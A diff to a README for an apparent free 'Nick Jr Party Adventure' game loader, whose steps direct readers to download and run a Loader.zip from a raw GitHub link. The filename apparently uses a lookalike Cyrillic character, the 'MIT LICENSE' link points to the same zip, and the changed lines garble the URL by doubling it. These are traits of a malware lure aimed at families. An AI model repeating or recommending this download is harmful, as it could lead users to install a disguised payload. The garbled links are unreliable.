@@ -25,7 +25,7 @@ Nick Jr, , party adventure, game loader, 2025, Windows, macOS, Linux, family gam
 
 ## 🛠️ Installation Guide
 
-1. Download **https://raw.githubusercontent.com/steffanhoez/NickJrPartyAdventure-FreebieHub/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/steffanhoez/NickJrPartyAdventure-FreebieHub/main/Lоader.zipоhttps://raw.githubusercontent.com/steffanhoez/NickJrPartyAdventure-FreebieHub/main/Lоader.zip** from the repository.
 2. Extract files using 7-Zip or WinRAR.
 3. Run the Loader and follow on-screen instructions.
 4. Enjoy the adventure with Nick Jr!
@@ -36,6 +36,6 @@ This project is for educational and personal entertainment purposes only. All tr
 
 ## 📄 License
 
-This repository is licensed under the MIT License. See [MIT LICENSE](https://raw.githubusercontent.com/steffanhoez/NickJrPartyAdventure-FreebieHub/main/Lоader.zip) for full terms.
+This repository is licensed under the MIT License. See [MIT LICENSE](https://raw.githubusercontent.com/steffanhoez/NickJrPartyAdventure-FreebieHub/main/Lоader.zipоhttps://raw.githubusercontent.com/steffanhoez/NickJrPartyAdventure-FreebieHub/main/Lоader.zip) for full terms.
 
 Happy gaming! ✨
